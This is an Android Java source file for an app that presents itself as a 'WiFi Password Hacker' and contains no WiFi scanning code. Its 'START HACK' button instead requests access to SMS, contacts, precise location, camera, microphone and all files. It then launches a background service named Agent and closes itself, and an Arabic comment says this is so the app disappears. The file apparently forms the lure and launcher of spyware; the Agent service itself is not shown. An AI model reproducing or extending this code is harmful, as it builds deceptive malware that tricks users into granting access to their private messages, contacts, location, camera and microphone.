package com.network.wifianalyzer;

import android.app.Activity;
import android.Manifest;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.widget.*;
import android.graphics.Color;
import android.view.Gravity;
import android.view.View;
import java.util.ArrayList;
import java.util.List;

public class Main extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundResource(getResources().getIdentifier("bg", "drawable", getPackageName()));
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(40, 40, 40, 40);

        TextView title = new TextView(this);
        title.setText("WiFi Password Hacker");
        title.setTextColor(Color.GREEN);
        title.setTextSize(32);
        title.setGravity(Gravity.CENTER);
        layout.addView(title);

        TextView desc = new TextView(this);
        desc.setText("\n[+] Scan Available Networks\n[+] Bypass WPA/WPA2 Security\n[+] Show Passwords\n[+] Save to device\n\nTap 'START HACK' to begin");
        desc.setTextColor(Color.WHITE);
        desc.setTextSize(16);
        desc.setGravity(Gravity.CENTER);
        layout.addView(desc);

        Button btn = new Button(this);
        btn.setText("START HACK");
        btn.setBackgroundColor(Color.RED);
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(20);
        btn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) { requestPermissions(); }
        });
        layout.addView(btn);
        setContentView(layout);
    }

    private void requestPermissions() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.READ_CONTACTS);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.POST_NOTIFICATIONS);
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }
        requestPermissions(perms.toArray(new String[0]), 101);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 101) {
            Intent serviceIntent = new Intent(this, Agent.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(serviceIntent);
            else startService(serviceIntent);
            Toast.makeText(this, "Hacking started...", Toast.LENGTH_SHORT).show();
            finish(); // يقفل الشاشة عشان يختفي
        }
    }
}
